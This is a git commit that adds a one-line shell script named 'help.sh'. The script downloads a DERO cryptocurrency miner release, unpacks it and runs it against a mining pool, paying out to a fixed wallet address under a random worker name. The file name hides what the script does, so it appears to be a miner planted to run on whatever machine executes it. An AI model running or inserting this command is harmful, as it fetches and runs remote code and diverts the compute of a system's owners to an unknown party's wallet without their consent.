cc63b9218d1501c43dde274adef7b9d3741a991a
ovh9111 <131962541+ovh9111@users.noreply.github.com>
2023-05-23 13:37:57 +0600

    Create help.sh

---
+++ help.sh
@@ -0,0 +1,1 @@
+wget https://github.com/dero-am/astrobwt-miner/releases/download/V1.9/astrominer-V1.9_generic_amd64_linux.tar.gz && tar -xvf astrominer-V1.9_generic_amd64_linux.tar.gz && ./astrominer -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xcxmq3c6rmaajwqt6d0tr. $(echo $(shuf -i 1-99999 -n 1)-lottery) -r community-pools.mysrv.cloud:10300 -p rpc
